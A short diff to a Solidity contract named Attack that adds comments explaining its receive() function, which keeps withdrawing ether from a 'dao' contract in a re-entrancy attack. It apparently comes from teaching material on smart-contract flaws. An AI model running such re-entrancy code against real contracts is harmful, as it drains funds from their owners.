@@ -19,6 +19,12 @@ contract Attack {
         dao.withdraw(msg.value);
     }
 
+    // This function is used when the DAO calls receive() on this contract.
+    // If attack() is called, it will deposit ether into the DAO,
+    // and then immediately withdraw it.
+    // If the DAO has enough balance, call receive(), which keeps withdrawing
+    // until the DAO's balance is less than the amount sent.
+    // This is a re-entrancy attack.
     receive() external payable {
         uint256 bal = address(dao).balance;
         if (bal >= msg.value) {
